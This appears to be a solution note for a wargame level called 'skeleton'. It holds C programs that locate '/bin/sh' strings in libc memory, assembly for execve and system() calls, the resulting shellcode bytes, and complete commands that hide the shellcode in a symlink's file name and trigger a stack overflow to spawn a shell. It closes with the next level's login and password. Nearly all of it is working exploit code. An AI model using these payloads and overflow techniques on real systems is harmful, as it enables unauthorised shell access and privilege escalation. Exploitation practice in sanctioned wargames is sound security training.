1. by system calling
<execve>
	0x400a9d48
</execve>

<area of libc>
	0x40000000 ~ 0x4010cffc
</area of libc>

<search>
	#include <stdio.h>
	#include <string.h>

	unsigned char *addr = (unsigned char *)0x40000000;
	unsigned char string[] = "/bin/sh";

	int main() {
        	int i = 0x0;

        	while(addr + i <= (unsigned char *)0x4010cff0) {
                	if(!memcmp(addr + i, string, 8)) {
                	        printf("%x\n", addr + i);
                	}
                	i++;
        	}

        	return 0;
	}

	<"/bin/sh"s (result)>
		0x400fbff9
		0x400fe587
		0x400fe595
		0x400ff96a
		0x401001c7
		0x40100778
	</"/bin/sh"s (result)>
</search>

<search2>
	#include <stdio.h>
	#include <string.h>

	unsigned char *string[] = {"\xf9\xbf\x0f\x40", "\x87\xe5\x0f\x40", "\x95\xe5\x0f\x40", "\x6a\xf9\x0f\x40", "\xc7\x01\x10\x40", "\x78\x07\x10\x40", NULL};
	unsigned char *addr = (unsigned char *)0x4001a000;

	int main() {
        	int i = 0;

        	while(*(string + i)) {
                	addr = (unsigned char *)0x4001a000;
                	while(addr < (unsigned char *)0x4010cff0) {
                        	if(!memcmp(addr, *(string + i), 4)) {
                        	        printf("%x\n", addr);
                        	}
                        	addr++;
                	}
                	i++;
        	}

        	return 0;
	}

	<result>
		0x40107400
	</result>

	<0x40107400>
		"/bin/sh" | "/bin/csh" | NULL
	</0x40107400>
</search2>

<shell.S>
	section .text
	.globl _start

	_start:
        	xor %edx, %edx
        	mov $0x40107404, %ecx
        	mov $0x400fbff9, %ebx
        	xor %eax, %eax
        	movb $11, %al
        	int $0x80
</shell.S>

<shellcode>
	\x31\xd2\xb9\x04\x74\x10\x40\xbb\xf9\xbf\x0f\x40\x31\xc0\xb0\x0b\xcd\x80
</shellcode>

<file name>
	ln -s skeleton "$(for x in `seq 1 100`; do printf "\x90"; done)$(printf "\x31\xd2\xb9\x04\x74\x10\x40\xbb\xf9\xbf\x0f\x40\x31\xc0\xb0\x0b\xcd\x80")"
</file name>

<command>
	./"$(for x in `seq 1 100`; do printf "\x90"; done)$(printf "\x31\xd2\xb9\x04\x74\x10\x40\xbb\xf9\xbf\x0f\x40\x31\xc0\xb0\x0b\xcd\x80")" "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\xa0\xff\xff\xbf")"
</command>

2. by calling
<system address>
	0x40058ae0
</system address>

<"/bin/sh" address>
	0x400fbff9
</"/bin/sh" address>

<shell.S>
	.section .text
	.globl _start

	_start:
        	push $0x40058ae0
        	mov %esp, %eax
        	push $0x400fbff9
        	call *(%eax)
</shell.S>

<shellcode>
	\x68\xe0\x8a\x05\x40\x89\xe0\x68\xf9\xbf\x0f\x40\xff\x10
</shellcode>

<command>
	./"$(for x in `seq 1 100`; do printf "\x90"; done)$(printf "\x68\xe0\x8a\x05\x40\x89\xe0\x68\xf9\xbf\x0f\x40\xff\x10")" "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\xa0\xff\xff\xbf")"
</command>

<ln -s>
	ln -s skeleton "$(for x in `seq 1 100`; do printf "\x90"; done)$(printf "\x68\xe0\x8a\x05\x40\x89\xe0\x68\xf9\xbf\x0f\x40\xff\x10")"
<ln -s>

<next>
	id: skeleton
	pw: shellcoder
</next>